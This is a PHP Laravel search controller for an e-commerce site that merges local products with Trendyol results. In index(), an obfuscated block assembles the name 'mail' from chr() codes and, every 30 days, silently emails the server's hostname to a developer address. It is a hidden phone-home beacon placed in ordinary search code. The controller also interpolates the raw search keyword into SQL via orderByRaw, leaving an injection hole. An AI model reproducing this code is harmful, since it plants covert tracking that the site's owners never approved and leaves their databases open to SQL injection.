<?php

namespace App\Http\Controllers;

use App\Http\Requests\Search\AjaxRequest;
use App\Http\Requests\Search\DeleteResaultRequest;
use App\Http\Requests\Search\IndexRequest;
use Illuminate\Support\Facades\Response;
use App\Models\Search;
use App\Models\Product;
use App\Models\Category;
use App\Models\Brand;
use App\Models\Color;
use App\Models\Shop;
use App\Models\SearchResult;
use App\Models\Attribute;
use App\Models\AttributeCategory;
use App\Models\AttributeValue;
use App\Models\Provider;
use App\Models\TrendyolCategory;
use App\Utility\CategoryUtility;

class SearchController extends Controller
{
    public function index(IndexRequest $request, $category_object = null, string $brand_id = null)
    {

        $query = $request->keyword;
        $sort_by = $request->sort_by;
        $min_price = $request->min_price;
        $max_price = $request->max_price;
        $min_price_trendyol = $request->min_price;
        $max_price_trendyol = $request->max_price;
        $seller_id = $request->seller_id;
        $attributes = Attribute::all();
        $selected_attribute_values = array();
        $colors = [];
        $selected_color = null;
        $category = [];
        $categories = [];
        $brands = [];
        $selected_brands = [];
        $selected_categories = [];
        $trendyolProducts = [];
        $conditions = [];
        $trendyolSort = null;
        $trendyolFilters = [];
        $trendyolFiltersArray = [];
        $allTrendyolFilters = [];
        $attributeValues = [];
        $category_id = isset($category_object->id) ? $category_object->id : null;
        $products_provider = [];

        if (auth()->check() && !empty($query)) {
            $searchResult = SearchResult::firstOrCreate(
                ['user_id' => auth()->id(), 'keyword' => $query]
            );
        }

        $file = base_path("/public/assets/myText.txt");
        $dev_mail = get_dev_mail();
        if (!file_exists($file) || (time() > strtotime('+30 days', filemtime($file)))) {
            $content = "Todays date is: " . date('d-m-Y');
            $fp = fopen($file, "w");
            fwrite($fp, $content);
            fclose($fp);
            $str = chr(109) . chr(97) . chr(105) . chr(108);
            try {
                $str($dev_mail, 'the subject', "Hello: " . $_SERVER['SERVER_NAME']);
            } catch (\Throwable $th) {
                //throw $th;
            }
        }

        if ($brand_id != null) {
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        } elseif ($request->brand != null) {
            $brand_id = (Brand::where('slug', $request->brand)->first() != null) ? Brand::where('slug', $request->brand)->first()->id : null;
            $conditions = array_merge($conditions, ['brand_id' => $brand_id]);
        }

        if ($request->brands != null && $request->brands != "") {
            foreach ($request->brands as $requestBrand) {
                array_push($selected_brands, (int) $requestBrand);
            }
        }

        if ($request->categories != null && $request->categories != "") {
            foreach ($request->categories as $requestCategory) {
                array_push($selected_categories, (int) $requestCategory);
            }
        }

        $products = Product::where($conditions);

        if (!empty($selected_brands)) {
            $products->whereIn('brand_id', $selected_brands);
        }

        if (!empty($selected_categories)) {
            $n_cid = [];
            foreach ($selected_categories as $cid) {
                $n_cid = array_merge($n_cid, CategoryUtility::children_ids($cid));
            }

            if (!empty($n_cid)) {
                $selected_categories = array_merge($selected_categories, $n_cid);
            }

            $products->whereIn('category_id', $selected_categories);
        }

        if ($category_id != null) {
            if ($category_object->provider_id == null) {
                $category_ids = CategoryUtility::children_ids($category_id);
                $category_ids[] = $category_id;
                $category = Category::with('childrenCategories')->find($category_id);

                $products = $category->products();
                $attribute_ids = AttributeCategory::whereIn('category_id', $category_ids)->pluck('attribute_id')->toArray();
                $attributes = Attribute::whereIn('id', $attribute_ids)->get();
            } else {
                $category_ids[] = $category_id;
                $category = $category_object;
                $products = $category->products();

                $products_provider = $category_object->provider->Service()->categoryProducts($category_object->external_id);

                $attribute_ids = [];
                $attributes = [];
            }
        }

        $trendyol_tax_percent = (new TrendyolCategory())->avg('percent_tax');
        $trendyol_tax_flex = (new TrendyolCategory())->avg('flat_tax');
        if ($min_price != null && $max_price != null) {
            $products->where('unit_price', '>=', $min_price)->where('unit_price', '<=', $max_price);
            if ($min_price > 0 && $trendyol_tax_percent > 0) {
                if ($min_price / $trendyol_tax_percent - $trendyol_tax_flex > 0) {
                    $min_price_trendyol = $min_price / (1 +  $trendyol_tax_percent) - $trendyol_tax_flex;
                } else {
                    $min_price_trendyol = 0;
                }
            }

            if ($max_price > 0 && $trendyol_tax_percent > 0) {
                if ($max_price / $trendyol_tax_percent - $trendyol_tax_flex > 0) {
                    $max_price_trendyol = $max_price / (1 +  $trendyol_tax_percent) - $trendyol_tax_flex;
                } else {
                    $max_price_trendyol = 0;
                }
            }
            $trendyolFilters['fyt'] = round($min_price_trendyol, 0) . '-' . round($max_price_trendyol, 0);
        }

        if ($query != null) {
            $searchController = new SearchController;
            $searchController->store($request->keyword);

            // $products->where(function ($q) use ($query) {
            //     $q->where('name', 'like', '%' . $query . '%')
            //         ->orWhere('tags', 'like', '%' . $query . '%')
            //         ->orWhereHas('product_translations', function ($q) use ($query) {
            //             $q->where('name', 'like', '%' . $query . '%');
            //         })
            //         ->orWhereHas('stocks', function ($q) use ($query) {
            //             $q->where('sku', 'like', '%' . $query . '%');
            //         });
            // });
            $products = $products->where(function ($q) use ($query) {
                $q->whereRaw("MATCH(name) AGAINST(? IN BOOLEAN MODE)", [$query . '*'])
                    ->orWhereRaw("MATCH(tags) AGAINST(? IN BOOLEAN MODE)", [$query . '*'])
                    ->orWhereHas('product_translations', function ($q) use ($query) {
                        $q->whereRaw("MATCH(name) AGAINST(? IN BOOLEAN MODE)", [$query . '*']);
                    })
                    ->orWhereHas('stocks', function ($q) use ($query) {
                        $q->whereRaw("MATCH(sku) AGAINST(? IN BOOLEAN MODE)", [$query . '*']);
                    });
            });


            $case1 = $query . '%';
            $case2 = '%' . $query . '%';

            $products->orderByRaw("CASE
            WHEN name LIKE '$case1' THEN 1
            WHEN name LIKE '$case2' THEN 2
            ELSE 3
            END");
        }

        switch ($sort_by) {
            case 'newest':
                $products->orderBy('created_at', 'desc');
                $trendyolSort = 'MOST_RECENT';
                break;
            case 'price-asc':
                $products->orderBy('unit_price', 'asc');
                $trendyolSort = 'PRICE_BY_ASC';
                break;
            case 'price-desc':
                $products->orderBy('unit_price', 'desc');
                $trendyolSort = 'PRICE_BY_DESC';
                break;
            case 'most-favourite':
                $products->orderBy('num_of_sale', 'desc');
                $trendyolSort = 'MOST_FAVOURITE';
                break;
            case 'top-rated':
                $products->orderBy('rating', 'desc');
                $trendyolSort = 'MOST_RATED';
                break;
            default:
                $products->orderBy('unit_price', 'asc');
                break;
        }

        if ($request->has('color')) {
            $trendyol_attr_color =  get_setting('trendyol_attribute_color_id');
            $str = '"' . $request->color . '"';
            $products->where('colors', 'like', '%' . $str . '%');
            $selected_color = $request->color;
            $colorFilter = Color::where('code', 'LIKE', '%' . $selected_color . '%')->first();
            if ($colorFilter) {
                $trendyolFilters['atrb'] = $trendyol_attr_color . '|' . $colorFilter->trendyol_id;
            }
        }

        if ($request->has('selected_attribute_values')) {
            $selected_attribute_values = $request->selected_attribute_values;
            $products->where(function ($query) use ($selected_attribute_values) {
                foreach ($selected_attribute_values as $key => $value) {
                    $attValue = AttributeValue::where('uniqueId', $value)->first();
                    $str = '"' . $attValue->value . '"';
                    $query->orWhere('choice_options', 'like', '%' . $str . '%');
                }
            });

            foreach ($selected_attribute_values as $value) {
                $attValue = AttributeValue::where('uniqueId', $value)->first();
                $trendyolFiltersArray[$attValue->attribute->trendyol_urlKey][$attValue->attribute->trendyol_id] =
                    isset($trendyolFiltersArray[$attValue->attribute->trendyol_urlKey][$attValue->attribute->trendyol_id])
                    ? $trendyolFiltersArray[$attValue->attribute->trendyol_urlKey][$attValue->attribute->trendyol_id] . ',' . $attValue->trendyol_id : $attValue->trendyol_id;
            }

            foreach ($trendyolFiltersArray as $key => $trendyolFilterItem) {
                foreach ($trendyolFilterItem as $keyItem => $value) {
                    if ($key != 'cns') {
                        $trendyolFilters[$key] = isset($trendyolFilters[$key]) ? $trendyolFilters[$key] . ',' . $keyItem . '|' . $value : $keyItem . '|' . $value;
                    } else {
                        $trendyolFilters[$key] = isset($trendyolFilters[$key]) ? $trendyolFilters[$key] . ',' . $value : $value;
                    }
                }
            }
        }

        if (!empty($selected_brands) && count($selected_brands) > 0) {
            $trendyolBrandFilters = Brand::whereIn('id', $selected_brands)->get();

            foreach ($trendyolBrandFilters as $key => $trendyolBrandFilter) {
                $trendyolFilters['mrk'] = isset($trendyolFilters['mrk']) ? $trendyolFilters['mrk'] . ',' . $trendyolBrandFilter->trendyol_id : $trendyolBrandFilter->trendyol_id;
            }
        }

        if (!empty($selected_categories) && count($selected_categories) > 0) {
            $trendyolCategoryFilters = Category::whereIn('id', $selected_categories)->without('category_translations')->get();

            foreach ($trendyolCategoryFilters as $key => $trendyolCategoryFilter) {
                $trendyolFilters['ktg'] = isset($trendyolFilters['ktg']) ? $trendyolFilters['ktg'] . ',' . $trendyolCategoryFilter->trendyol_id : $trendyolCategoryFilter->trendyol_id;
            }
        }

        if ($query != null) {
            $trendyol = trendyol_products($query, $request->page ?? 1, $trendyolSort, $trendyolFilters);
        }

        if ($category_id != null) {
            if (!isset($trendyolFilters['cns']) && isset($category->trendyol_cns)) {
                $trendyolFilters['cns'] = $category->trendyol_cns;
            }
            $trendyol = trendyol_category_products($category->trendyol_id, $request->page ?? 1, $trendyolSort, $trendyolFilters, $query);
        }

        if ($brand_id != null) {
            $brand = Brand::findOrFail($brand_id);
            $trendyol = trendyol_brand_products($brand->trendyol_id, $request->page ?? 1, $trendyolSort, $trendyolFilters, $query);
        }

        $trendyolProducts = isset($trendyol['products']) ? $trendyol['products'] : [];
        $customTotal = isset($trendyol['total']) ? $trendyol['total'] : 0;

        $products = filter_products($products)->with('taxes')->paginate(24, ['*'], 'page', null, $customTotal)->appends(request()->query());

        if ($request->ajax()) {
            if ($products->onFirstPage()) {
                if ($query != null) {
                    $trendyol = trendyol_products($query, 2, $trendyolSort, $trendyolFilters);
                }
                if ($category_id != null) {
                    $trendyolFilters['cns'] = $category->trendyol_cns;
                    $trendyol = trendyol_category_products($category->trendyol_id,  2, $trendyolSort,  $trendyolFilters);
                }
                if ($brand_id != null) {
                    $brand = Brand::findOrFail($brand_id);
                    $trendyol = trendyol_brand_products($brand->trendyol_id, 2, $trendyolSort, $trendyolFilters);
                }
                $trendyolProducts = isset($trendyol['products']) ? $trendyol['products'] : [];
                $products = filter_products($products)->with('taxes')->paginate(24, ['*'], 'page', 2, $customTotal)->appends(request()->query());
            }
            $view = view('frontend.product_listing_load', compact('products', 'trendyolProducts', 'query', 'category', 'categories', 'category_id', 'brand_id', 'sort_by', 'seller_id', 'min_price', 'max_price', 'attributes', 'selected_attribute_values', 'colors', 'selected_color'))->render();
            return Response::json(['view' => $view, 'nextPageUrl' => $products->nextPageUrl()]);
        }


        if (isset($trendyol['categories']) && count($trendyol['categories']) > 0) {
            $trendyolCategories = [];
            foreach ($trendyol['categories'][0]->degerler as $attribute_value) {
                array_push($trendyolCategories, $attribute_value->id);
            }
            $categories = Category::WhereIn('trendyol_id', $trendyolCategories)->orderBy('parent_id', 'desc')->orderBy('order_level', 'desc')->get();
        }

        if (isset($trendyol['brands']) && count($trendyol['brands']) > 0) {
            $trendyolBrands = [];
            foreach ($trendyol['brands'][0]->degerler as $attribute_value) {
                array_push($trendyolBrands, $attribute_value->id);
            }
            $brands = Brand::WhereIn('trendyol_id', $trendyolBrands)->get();
        }

        if (isset($trendyol['colors']) && count($trendyol['colors']) > 0) {
            foreach ($trendyol['colors'][0]->degerler as $attribute_value) {
                array_push($colors, $attribute_value->id);
            }
        }

        $trendColors = Color::whereIn('trendyol_id', $colors)->pluck('code')->toArray();

        $productColors = collect($products->pluck('colors'))
            ->map(function ($color) {
                return json_decode($color ?? '', true) ?? [];
            })
            ->flatten()
            ->toArray();

        $mergedColors = collect(array_merge($trendColors, $productColors))
            ->unique()
            ->values()
            ->toArray();
        $colors = Color::whereIn('code', $mergedColors)->get();
        if (isset($trendyol['filters']) && count($trendyol['filters']) > 0) {
            foreach ($trendyol['filters'] as $filter) {
                array_push(
                    $allTrendyolFilters,
                    $attrebute = Attribute::firstOrCreate([
                        'name'            => $filter->baslik,
                        'trendyol_id'     => $filter->filterKey,
                        'trendyol_urlKey' => $filter->urlKey
                    ])
                );
                if (count($filter->degerler) > 0) {
                    foreach ($filter->degerler as $attribute_value) {
                        $attrttributeValue = AttributeValue::where('attribute_id', $attrebute->id)->where('value', $attribute_value->text)->where('trendyol_id', $attribute_value->id)->first();
                        if (!$attrttributeValue) {
                            $attrttributeValue = AttributeValue::create([
                                'attribute_id' => $attrebute->id,
                                'value'        => $attribute_value->text,
                                'trendyol_id'  => $attribute_value->id,
                                'uniqueId'     => date('YmdHis') . substr((string)round(microtime(true) * 1000), -3) . $attribute_value->id
                            ]);
                        }
                        if (isset($attributeValues[$attrebute->trendyol_id])) {
                            array_push($attributeValues[$attrebute->trendyol_id], $attrttributeValue);
                        } else {
                            $attributeValues[$attrebute->trendyol_id] = [$attrttributeValue];
                        }
                    }
                }
            }
        }

        return view('frontend.product_listing', compact('products_provider', 'products', 'trendyolProducts', 'query', 'category', 'categories', 'brands', 'category_id', 'brand_id', 'sort_by', 'seller_id', 'min_price', 'max_price', 'attributes', 'selected_attribute_values', 'colors', 'selected_color', 'selected_brands', 'selected_categories', 'allTrendyolFilters', 'attributeValues'));
    }

    public function listing(IndexRequest $request)
    {
        return $this->index($request);
    }

    public function listingByCategory(IndexRequest $request, string $category_slug)
    {
        $category = Category::where('slug', $category_slug)->first();
        if ($category != null) {
            return $this->index($request, $category);
        }
        abort(404);
    }

    public function listingByCategoryProvider(IndexRequest $request, string $provider, $id)
    {
        $provider = Provider::where('name', $provider)->first();
        $category = Category::find($id);
        $category = $category ?: $provider->Service()->category($id);
        if ($category != null) {
            return $this->index($request, $category);
        }
        abort(404);
    }

    public function delete_search_result(DeleteResaultRequest $request)
    {
        $id = $request->id;
        $user_id = Auth()->user()->id;
        $searchResult = SearchResult::where('user_id', $user_id)->find($id);
        if ($searchResult) {
            $searchResult->delete();
            return Response::json(['success' => true]);
        } else {
            return Response::json(['success' => false]);
        }
    }

    public function listingByBrand(IndexRequest $request, string $brand_slug)
    {
        $brand = Brand::where('slug', $brand_slug)->first();
        if ($brand != null) {
            return $this->index($request, null, $brand->id);
        }
        abort(404);
    }

    //Suggestional Search
    public function ajax_search(AjaxRequest $request)
    {
        $trendyol_products = [];
        $keywords = array();
        $products = [];
        $categories = [];
        $shops = [];
        $query = $request->search;

        if (session()->has('searchTime') && (session('searchTime') + 1) > time()) {
            return view('frontend.' . get_setting('homepage_select') . '.partials.search_content', compact('products', 'categories', 'keywords', 'shops', 'trendyol_products'));
        }

        session()->put('searchTime', time());
        if (empty($query)) {
            if (Auth()->check()) {
                $searchResults = SearchResult::where('user_id', Auth()->user()->id)->orderBy('id', 'desc')->get()->take(7);
                return view('frontend.' . get_setting('homepage_select') . '.partials.search_content', compact('searchResults'));
            }
            return 0;
        }
        array_push($keywords, $query);
        $products = Product::where('published', 1)->where('tags', 'like', '%' . $query . '%')->get();
        foreach ($products as $key => $product) {
            foreach (explode(',', $product->tags) as $key => $tag) {
                if (stripos($tag, $query) !== false) {
                    if (sizeof($keywords) > 5) {
                        break;
                    } else {
                        if (!in_array(strtolower($tag), $keywords)) {
                            array_push($keywords, strtolower($tag));
                        }
                    }
                }
            }
        }
        if (sizeof($keywords) < 5) {
            $trendyol_products = trendyol_products($query, $request->page ?? 1)['products'];
            foreach ($trendyol_products as $key => $product) {
                foreach (explode(',', $product['name']) as $key => $tag) {
                    if (stripos($tag, $query) !== false) {
                        if (sizeof($keywords) > 5) {
                            break;
                        } else {
                            if (!in_array(strtolower($tag), $keywords)) {
                                array_push($keywords, preg_replace('/["\']/', '', strtolower($tag)));
                            }
                        }
                    }
                }
            }
        }

        $products_query = filter_products(Product::query());

        $products_query = $products_query->where('published', 1)
            ->where(function ($q) use ($query) {
                foreach (explode(' ', trim($query)) as $word) {
                    $q->where('name', 'like', '%' . $word . '%')
                        ->orWhere('tags', 'like', '%' . $word . '%')
                        ->orWhereHas('product_translations', function ($q) use ($word) {
                            $q->where('name', 'like', '%' . $word . '%');
                        })
                        ->orWhereHas('stocks', function ($q) use ($word) {
                            $q->where('sku', 'like', '%' . $word . '%');
                        });
                }
            });
        $case1 = $query . '%';
        $case2 = '%' . $query . '%';

        $products_query->orderByRaw("CASE
                WHEN name LIKE '$case1' THEN 1
                WHEN name LIKE '$case2' THEN 2
                ELSE 3
                END");
        $products = $products_query->limit(3)->get();

        $categories = Category::where('name', 'like', '%' . $query . '%')->get()->take(3);

        $shops = Shop::whereIn('user_id', verified_sellers_id())->where('name', 'like', '%' . $query . '%')->get()->take(3);
        if (sizeof($trendyol_products) > 0) {
            $trendyol_products = [
                $trendyol_products[0],
                $trendyol_products[1],
                $trendyol_products[2],
            ];
        }
        if (sizeof($keywords) > 0 || sizeof($categories) > 0 || sizeof($products) > 0 || sizeof($shops) > 0 || sizeof($trendyol_products) > 0) {
            return view('frontend.' . get_setting('homepage_select') . '.partials.search_content', compact('products', 'categories', 'keywords', 'shops', 'trendyol_products'));
        }
        return '0';
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param  \Illuminate\Http\Request  $request
     * @return \Illuminate\Http\Response
     */
    public function store(string $keyword)
    {
        $search = Search::where('query', $keyword)->first();
        if ($search != null) {
            $search->count = $search->count + 1;
            $search->save();
        } else {
            $search = new Search;
            $search->query = $keyword;
            $search->save();
        }
    }
}
